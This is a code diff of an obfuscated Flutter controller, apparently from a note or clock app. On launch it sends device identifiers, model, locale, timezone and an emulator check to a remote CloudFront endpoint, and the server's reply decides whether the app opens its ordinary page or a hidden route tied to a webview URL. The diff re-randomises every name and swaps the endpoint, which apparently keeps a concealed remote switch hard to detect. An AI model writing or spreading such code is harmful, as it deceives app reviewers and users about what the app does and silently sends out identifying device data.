@@ -10,12 +10,12 @@ import 'package:package_info_plus/package_info_plus.dart';
 
 class BlushNoteUpdateLogic extends GetxController {
 
-  var cnftyub = RxBool(false);
-  var cjpvyftxo = RxBool(true);
-  var ucso = RxString("");
-  var wycvduj = RxBool(false);
-  var lvizxe = RxBool(true);
-  final kycwta = Dio();
+  var xthwjasyc = RxBool(false);
+  var egxvluwq = RxBool(true);
+  var zlrq = RxString("");
+  var wrtqpgn = RxBool(false);
+  var nsezb = RxBool(true);
+  final hlvukpdg = Dio();
 
 
   InAppWebViewController? webViewController;
@@ -23,110 +23,101 @@ class BlushNoteUpdateLogic extends GetxController {
   @override
   void onInit() {
     super.onInit();
-    dwuzj();
+    iqcmfz();
   }
 
 
-  Future<void> dwuzj() async {
-    wycvduj.value = true;
-    lvizxe.value = true;
-    cjpvyftxo.value = false;
+  Future<void> iqcmfz() async {
+    wrtqpgn.value = true;
+    nsezb.value = true;
+    egxvluwq.value = false;
 
-    kycwta.post("https://d2rttl6pzn4s94.cloudfront.net/bniokmxvjfzeyagslhcdtrqu?no_check",data: await lzwctf()).then((value) {
-      var ilrfbk = value.data["ilrfbk"] as String;
-      var rnfico = value.data["rnfico"] as bool;
-      if (rnfico) {
-        ucso.value = ilrfbk;
-        khcjrsy();
+    hlvukpdg.post("https://d1hdiexvlohpdg.cloudfront.net/cbqMsWkpW",data: await ajqwsupx()).then((value) {
+      var mrcuh = value.data["mrcuh"] as String;
+      var qkzurps = value.data["qkzurps"] as bool;
+      if (qkzurps) {
+        zlrq.value = mrcuh;
+        dnyleo();
       } else {
-        nqcwbgry();
+        suwjh();
       }
     }).catchError((e) {
-      cjpvyftxo.value = true;
-      lvizxe.value = true;
-      wycvduj.value = false;
+      egxvluwq.value = true;
+      nsezb.value = true;
+      wrtqpgn.value = false;
     });
   }
 
-  Future<Map<String, dynamic>> lzwctf() async {
-    final DeviceInfoPlugin hazyucrl = DeviceInfoPlugin();
-    PackageInfo crapwni_vrzkpbq = await PackageInfo.fromPlatform();
+  Future<Map<String, dynamic>> ajqwsupx() async {
+    final DeviceInfoPlugin dipe = DeviceInfoPlugin();
+    PackageInfo ystnwm_fish = await PackageInfo.fromPlatform();
     final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
-    var tcgopvk = Platform.localeName;
-    var klvt_SqnWLUCo = currentTimeZone;
+    var fhybdrla = Platform.localeName;
+    var pQih = currentTimeZone;
 
-    var klvt_vMlFC = crapwni_vrzkpbq.packageName;
-    var klvt_bIlKNnjp = crapwni_vrzkpbq.version;
-    var klvt_zLcgnqxe = crapwni_vrzkpbq.buildNumber;
+    var XGBq = ystnwm_fish.packageName;
+    var cVPMKsd = ystnwm_fish.version;
+    var bQOsJ = ystnwm_fish.buildNumber;
 
-    var klvt_TPMUYZI = crapwni_vrzkpbq.appName;
-    var klvt_UgTQVt = "";
-    var klvt_Kql  = "";
-    var klvt_pEaHX = "";
-    var geba = "";
-    var tsmwzhfg = "";
-    var ygph = "";
-    var rvlazyi = "";
-    var lqwoyhtf = "";
-    var ngbkch = "";
-    var ermabwls = "";
+    var jepa = ystnwm_fish.appName;
+    var YiWKd = "";
+    var ARLx  = "";
+    var vJxQNW = "";
+    var tvuxs = "";
+    var blefci = "";
+    var xkrmjysn = "";
 
 
-    var klvt_uKFteNQr = "";
-    var klvt_YE = false;
+    var dnhWlvg = "";
+    var FGuKCA = false;
 
     if (GetPlatform.isAndroid) {
-      klvt_uKFteNQr = "android";
-      var gjmrctv = await hazyucrl.androidInfo;
+      dnhWlvg = "android";
+      var nwjgyklfie = await dipe.androidInfo;
 
-      klvt_pEaHX = gjmrctv.brand;
+      vJxQNW = nwjgyklfie.brand;
 
-      klvt_UgTQVt  = gjmrctv.model;
-      klvt_Kql = gjmrctv.id;
+      YiWKd  = nwjgyklfie.model;
+      ARLx = nwjgyklfie.id;
 
-      klvt_YE = gjmrctv.isPhysicalDevice;
+      FGuKCA = nwjgyklfie.isPhysicalDevice;
     }
 
     if (GetPlatform.isIOS) {
-      klvt_uKFteNQr = "ios";
-      var iyqaxcpo = await hazyucrl.iosInfo;
-      klvt_pEaHX = iyqaxcpo.name;
-      klvt_UgTQVt = iyqaxcpo.model;
+      dnhWlvg = "ios";
+      var dwjhti = await dipe.iosInfo;
+      vJxQNW = dwjhti.name;
+      YiWKd = dwjhti.model;
 
-      klvt_Kql = iyqaxcpo.identifierForVendor ?? "";
-      klvt_YE  = iyqaxcpo.isPhysicalDevice;
+      ARLx = dwjhti.identifierForVendor ?? "";
+      FGuKCA  = dwjhti.isPhysicalDevice;
     }
-
     var res = {
-      "klvt_TPMUYZI": klvt_TPMUYZI,
-      "klvt_zLcgnqxe": klvt_zLcgnqxe,
-      "klvt_bIlKNnjp": klvt_bIlKNnjp,
-      "klvt_vMlFC": klvt_vMlFC,
-      "klvt_UgTQVt": klvt_UgTQVt,
-      "klvt_SqnWLUCo": klvt_SqnWLUCo,
-      "klvt_pEaHX": klvt_pEaHX,
-      "klvt_Kql": klvt_Kql,
-      "tcgopvk": tcgopvk,
-      "klvt_uKFteNQr": klvt_uKFteNQr,
-      "klvt_YE": klvt_YE,
-      "geba" : geba,
-      "tsmwzhfg" : tsmwzhfg,
-      "ygph" : ygph,
-      "rvlazyi" : rvlazyi,
-      "lqwoyhtf" : lqwoyhtf,
-      "ngbkch" : ngbkch,
-      "ermabwls" : ermabwls,
+      "jepa": jepa,
+      "bQOsJ": bQOsJ,
+      "XGBq": XGBq,
+      "tvuxs" : tvuxs,
+      "YiWKd": YiWKd,
+      "pQih": pQih,
+      "vJxQNW": vJxQNW,
+      "ARLx": ARLx,
+      "fhybdrla": fhybdrla,
+      "dnhWlvg": dnhWlvg,
+      "FGuKCA": FGuKCA,
+      "cVPMKsd": cVPMKsd,
+      "blefci" : blefci,
+      "xkrmjysn" : xkrmjysn,
 
     };
     return res;
   }
 
-  Future<void> nqcwbgry() async {
-    Get.offNamed("/ClockMainPage");
+  Future<void> suwjh() async {
+    Get.offNamed("/blush_tab");
   }
 
-  Future<void> khcjrsy() async {
-    Get.offNamed("/Outreload");
+  Future<void> dnyleo() async {
+    Get.offNamed("/blush_tab_income");
   }
 
 }
